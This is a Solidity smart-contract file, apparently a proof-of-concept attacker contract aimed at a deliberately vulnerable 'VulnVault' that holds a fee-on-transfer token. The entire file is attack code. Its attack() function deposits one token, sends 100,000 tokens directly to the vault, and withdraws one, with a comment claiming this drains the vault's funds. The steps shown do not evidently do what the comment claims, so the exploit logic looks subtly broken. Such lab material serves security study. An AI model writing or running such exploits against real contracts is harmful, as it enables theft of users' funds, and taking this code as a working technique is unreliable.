// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./fee-on-transfer.sol";

contract MaliciousAttacker {
    STA public staToken;
    VulnVault public vulnVault;

    constructor(address _staToken, address _vulnVault) {
        staToken = STA(_staToken);
        vulnVault = VulnVault(_vulnVault);
    }

    function attack() external {
        // Step 1: Deposit a small amount (e.g. 1 STA token) into the VulnVault
        staToken.approve(address(vulnVault), 1);
        vulnVault.deposit(1);

        // Step 2: Transfer a large amount (e.g. 100,000 STA tokens) directly to the VulnVault
        staToken.transfer(address(vulnVault), 100_000);

        // Step 3: Withdraw the original 1 STA token deposit, draining the vault's funds
        vulnVault.withdraw(1);
    }
}